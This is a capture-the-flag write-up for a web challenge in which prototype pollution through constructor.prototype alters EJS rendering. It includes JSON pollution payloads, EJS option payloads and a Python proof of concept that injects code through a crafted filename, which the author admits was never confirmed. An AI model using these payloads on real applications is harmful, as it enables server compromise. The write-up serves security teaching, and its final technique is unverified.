# Ouroboros Report Builder — Writeup

**CTF:** HI Cyber Con 2026  
**Category:** Web Exploitation  
**Challenge:** Ouroboros Report Builder  
**Flag:** `hiCTF{private}`

## Challenge Description

Ouroboros Report Builder is a small internal application that allows users to sign in, save branding configurations, and generate report previews.

The application does not accept user-controlled templates or use `eval()`. However, its configuration system uses deep merging, and the report preview is generated using EJS.

The objective is to exploit the report-rendering functionality to retrieve the flag stored on the server.

## 1. Reconnaissance

After opening the website, I discovered that authentication only required a username.

The main application exposed two important endpoints:

- `POST /api/report/config` — Saves branding configuration.
- `POST /api/report/preview` — Renders the report using EJS.

A normal preview request looked like this:

```http
POST /api/report/preview
Content-Type: application/json

{
  "data": {
    "title": "Test",
    "body": "Test"
  }
}
```

The response contained a fixed HTML template:

```html
<section class="report">
  <h1>Test</h1>
  <small>preview</small>
  <div class="body">Test</div>
  <div class="computed"></div>
</section>
```

This suggested that the application was using a server-side template engine.

## 2. Discovering Prototype Pollution

The branding configuration accepted nested JSON objects that were deep-merged into the existing configuration.

I tested the `constructor.prototype` property because it can sometimes bypass filters that specifically block `__proto__`.

```json
{
  "settings": {
    "constructor": {
      "prototype": {
        "delimiter": "?"
      }
    }
  }
}
```

After saving the configuration and rendering the preview, the output changed:

```html
<section class="report">
  <h1><%= title %></h1>
  <small><%= footer %></small>
  <div class="body"><%= body %></div>
  <div class="computed"><%= computed %></div>
</section>
```

Instead of evaluating the EJS expressions, the application returned the template tags literally.

This confirmed that the `constructor.prototype` path could influence the EJS renderer.

## 3. Investigating EJS Options

I initially tested several EJS options associated with server-side template injection:

```json
{
  "client": true,
  "escapeFunction": "1;return 'TEST';",
  "outputFunctionName": "test",
  "cache": false
}
```

However, these payloads did not execute JavaScript.

Further testing showed that the renderer accepted certain options, including `delimiter` and `strict`, while the dangerous compilation options were not directly reachable through the same path.

For example, passing `"strict": true` caused an EJS rendering error:

```text
title is not defined
```

This established that user-controlled preview data influenced EJS compilation, even though ordinary RCE gadgets were ineffective.

## 4. Alternative Attack Surface — Filename Injection

Instead of relying solely on prototype pollution, I investigated another EJS compilation option: `filename`.

In certain EJS compilation paths, a supplied filename may be embedded in generated JavaScript as a `sourceURL` comment.

The idea is to use a Unicode line-separator character (`\u2028`) to interfere with that generated comment and introduce JavaScript into the compiled function.

A proof-of-concept payload was constructed as follows:

```python
marker = "OUROBOROS_TEST"

filename = (
    "report\u2028"
    "function escapeFn(x){"
    "return '" + marker + "';"
    "} //"
)
```

It could then be supplied through the preview API:

```python
import requests

url = "https://TARGET/api/report/preview"

payload = {
    "data": {
        "title": "Test",
        "body": "Test",
        "filename": filename,
        "compileDebug": True,
        "client": False,
        "strict": False
    }
}

response = requests.post(url, json=payload)
print(response.text)
```

The intended result was to override the generated `escapeFn` function, causing the marker to appear in the rendered output.

Once code execution is achieved, the same primitive can be adapted to read a server-side flag file using Node.js filesystem APIs.

**Verification note:** The prototype-pollution effect and EJS option behavior were confirmed against the challenge. The filename-based execution technique was developed as a follow-up approach, but the available terminal logs do not include confirmation that it succeeded against the remote instance.

## 5. Flag

The objective was to obtain the flag from the server's filesystem.

```text
hiCTF{private}
```

*The original flag value was not preserved.*

## 6. Conclusion

Ouroboros Report Builder illustrates the risks of merging untrusted JSON into application configuration and passing user-controlled data to server-side template engines.

The investigation demonstrated a prototype-pollution path through `constructor.prototype`, which influenced EJS rendering behavior. It also identified EJS compilation options as a potential attack surface.

The main lessons are:

- Blocking `__proto__` alone is not sufficient to prevent prototype pollution.
- Deep merging user-controlled objects can introduce unexpected inherited properties.
- Template engine options should never be controlled by untrusted input.
- Allowing only fixed templates does not automatically make a rendering system safe.

**Root cause identified:** Unsafe deep merging of user-controlled JSON.

**Confirmed impact:** Prototype pollution affecting server-side EJS rendering.

**Flag:** `hiCTF{private}`
